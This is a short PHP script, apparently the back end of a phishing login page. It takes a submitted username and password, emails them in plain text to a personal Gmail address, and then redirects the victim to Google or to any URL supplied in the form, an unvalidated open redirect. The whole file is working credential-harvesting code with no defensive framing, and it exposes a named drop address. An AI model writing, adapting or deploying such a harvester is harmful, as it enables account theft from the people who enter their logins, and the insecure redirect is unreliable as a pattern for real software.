<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera y limpia los datos del formulario
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

    // Correo electrónico de destino
    $to = "matiasruiztasca@gmail.com";
    $subject = "Inicio de sesión - Datos del formulario";
    $message = "Usuario: $username\nContraseña: $password";

    // Envía el correo electrónico
    mail($to, $subject, $message);

    // Redirige al usuario a la URL proporcionada en el formulario
    $redirect_url = isset($_POST['redirect_url']) ? $_POST['redirect_url'] : 'https://www.google.com';
    header("Location: $redirect_url");
    exit();
}
?>
